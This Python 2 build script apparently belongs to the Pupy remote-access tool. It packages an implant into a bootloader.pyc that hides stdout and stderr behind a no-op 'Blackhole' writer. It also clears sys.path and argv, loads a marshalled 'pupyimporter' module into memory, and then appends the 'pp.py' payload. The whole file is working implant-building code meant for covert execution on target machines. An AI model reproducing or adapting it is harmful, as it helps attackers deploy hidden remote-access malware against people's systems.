#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import marshal
import struct
import base64
import os.path
import argparse

remove_stdout='''
import sys
class Blackhole(object):
    softspace = 0
    def read(self):
        pass
    def write(self, text):
        pass
    def flush(self):
        pass
sys.stdout = Blackhole()
sys.stderr = Blackhole()
del Blackhole
'''

pupyload = '''
import marshal, imp, sys
fullname = "{}"
mod = imp.new_module(fullname)
mod.__file__ = "<bootloader>/{{}}".format(fullname)
exec marshal.loads({}) in mod.__dict__
sys.modules[fullname]=mod
'''

if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-debug',
        action='store_true',
        default=False,
        help='Show debug messages from bootloader'
    )
    parser.add_argument(
        '-pass-argv',
        action='store_true',
        default=False,
        help='Pass argv to the pp.py'
    )
    args = parser.parse_args(sys.argv[1:])

    pupyimporter = None
    with open(os.path.join('..', '..', 'pupy', 'packages', 'all', 'pupyimporter.py')) as f:
        pupyimporter = f.read()

    pp = None
    with open(os.path.join('..','..','pupy','pp.py')) as f:
        pp = f.read()

    pupyimporter = marshal.dumps(
        compile(pupyimporter, '<string>', 'exec')
    )

    bootloader = [
        remove_stdout if not args.debug else 'print "DEBUG"\n',
        'import sys; sys.path=[]; ' + (
            'sys.argv = [];' if not args.pass_argv else ''
        ) + '\n',
        pupyload.format('pupyimporter', repr(pupyimporter)),
        'import pupyimporter\n'
        'pupyimporter.install({})\n'.format(args.debug),
        pp+'\n',
    ]

    with open(os.path.join("resources","bootloader.pyc"),'wb') as w:
        w.write(marshal.dumps([
            compile(block, '<string>', 'exec') for block in bootloader
        ]))
